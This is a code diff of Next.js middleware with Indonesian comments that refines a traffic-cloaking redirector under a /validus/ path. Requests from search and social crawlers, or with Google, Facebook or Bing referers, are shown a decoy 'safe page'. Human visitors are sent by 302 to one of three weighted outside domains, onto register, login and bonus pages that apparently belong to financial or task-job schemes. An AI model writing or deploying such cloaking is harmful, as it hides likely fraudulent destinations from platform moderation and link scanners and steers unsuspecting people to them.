@@ -4,18 +4,14 @@ import { NextResponse } from 'next/server';
 // 1. KONFIGURASI KHUSUS ANDA
 // ===============================================
 
-// JALUR UTAMA YANG MENGAKTIFKAN PENGALIHAN
 const ACTIVE_REDIRECT_PATH = '/validus/'; 
 
-// URL TARGET BERBOBOT (Weighted Targets)
 const TARGET_URLS_WEIGHTED = [
-    // [Domain Dasar, Bobot/Prioritas]
     ["https://ventureidven.com", 70],  
     ["https://akunfinansial.com", 20],   
     ["https://platformtugas.com", 10]    
 ];
 
-// USER AGENT BOT/CRAWLER
 const BOT_AGENTS = ["googlebot", "bingbot", "yahoo! slurp", "adsbot", "facebookexternalhit"];
 const SUSPICIOUS_REFERERS = ["google.com", "facebook.com", "bing.com"];
 
@@ -31,7 +27,7 @@ export default function middleware(request) {
     const referer = request.headers.get('referer')?.toLowerCase() || '';
 
     let isBot = false;
-    // Pengecekan Bot (WhatsApp, Facebook, Google, dll. akan terdeteksi di sini)
+    // Pengecekan Bot
     for (const bot of BOT_AGENTS) {
         if (userAgent.includes(bot)) { isBot = true; break; }
     }
@@ -39,12 +35,11 @@ export default function middleware(request) {
         if (referer.includes(ref)) { isBot = true; break; }
     }
 
-    // Pengecekan Path
-    const isCorrectBasePath = pathname.startsWith(ACTIVE_REDIRECT_PATH);
+    // Middleware HANYA berjalan pada path /validus/ (lihat bagian config di bawah)
 
     // KONDISI 1: JALUR BENAR DAN BUKAN BOT (HUMAN)
-    if (isCorrectBasePath && !isBot) {
-        // ---- LOGIKA RANDOM BERBOBOT ----
+    if (!isBot) { 
+        // Logika redirect berbobot Anda
         const totalWeight = TARGET_URLS_WEIGHTED.reduce((sum, item) => sum + item[1], 0);
         let randomValue = Math.random() * totalWeight;
         let randomBaseDomain = '';
@@ -56,41 +51,35 @@ export default function middleware(request) {
                 break;
             }
         }
-        // ---------------------------------
 
-        // 2. Ambil Sisa Path TEPAT setelah '/validus'
-        let remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length);
-
-        // 3. Tentukan Path Tujuan Sebenarnya (Mapping)
+        let remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length - 1); // Ambil sisa path
         let targetPath = '/'; 
 
-        if (remainingPath === 'daftar' || remainingPath === '/daftar') {
+        // Mapping Path
+        if (remainingPath.includes('daftar')) {
             targetPath = '/index/user/register';
-        } else if (remainingPath === 'home' || remainingPath === '/home') {
+        } else if (remainingPath.includes('home')) {
             targetPath = '/index/my/index';
-        } else if (remainingPath === 'login' || remainingPath === '/login') {
+        } else if (remainingPath.includes('login')) {
             targetPath = '/index/user/login';
-        } 
-        else if (remainingPath === 'bonus' || remainingPath === '/bonus') { 
+        } else if (remainingPath.includes('bonus')) { 
             targetPath = '/index/promo/bonus'; 
-        }
-        else {
+        } else {
             targetPath = '/';
         } 
         
-        // 4. Gabungkan Domain Dasar + Path Tujuan
         const finalRedirectUrl = randomBaseDomain + targetPath;
 
-        // Lakukan Pengalihan 302
         return NextResponse.redirect(finalRedirectUrl, 302);
     } 
     
-    // KONDISI 2: JALUR SALAH ATAU TERDETEKSI BOT/SCRAPER
-    // Tampilkan Konten Aman (Rewrite ke root path)
-    return NextResponse.rewrite(new URL('/index.html', url)); 
+    // KONDISI 2: JIKA BOT (SCRAPER) TERDETEKSI
+    // Rewrite ke root path, yang akan me-render app/page.js (Halaman Aman)
+    return NextResponse.rewrite(new URL('/', url)); 
 }
 
-// Konfigurasi agar Middleware berjalan di SEMUA PATH
+// Konfigurasi: Middleware HANYA berjalan pada path yang mengandung /validus/
+// Ini akan memastikan root path (https://aksesmembership.vercel.app/) berjalan normal
 export const config = {
-    matcher: ['/:path*'],
+    matcher: ['/validus/:path*'],
 };
